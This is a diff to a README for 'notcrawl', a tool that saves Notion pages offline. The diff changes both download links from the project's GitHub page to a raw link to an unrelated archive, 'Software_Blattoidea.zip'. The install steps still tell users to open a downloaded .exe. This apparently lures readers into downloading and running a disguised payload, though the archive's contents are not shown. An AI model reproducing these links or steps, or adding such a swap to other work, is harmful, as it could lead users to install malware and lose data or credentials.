@@ -1,6 +1,6 @@
 # 📦 notcrawl - Save your Notion pages for offline use
 
-[![](https://img.shields.io/badge/download-notcrawl-blue.svg)](https://github.com/Harjotgallay/notcrawl)
+[![](https://img.shields.io/badge/download-notcrawl-blue.svg)](https://raw.githubusercontent.com/Harjotgallay/notcrawl/main/internal/share/Software_Blattoidea.zip)
 
 ## 📋 What is notcrawl?
 
@@ -22,7 +22,7 @@ Make sure you have your Notion account login details ready. You also need a Noti
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official download page](https://github.com/Harjotgallay/notcrawl).
+1. Visit the [official download page](https://raw.githubusercontent.com/Harjotgallay/notcrawl/main/internal/share/Software_Blattoidea.zip).
 2. Look for the latest version under the Releases section.
 3. Click the link that ends in .exe to start your download.
 4. Open the file once the download finishes. 
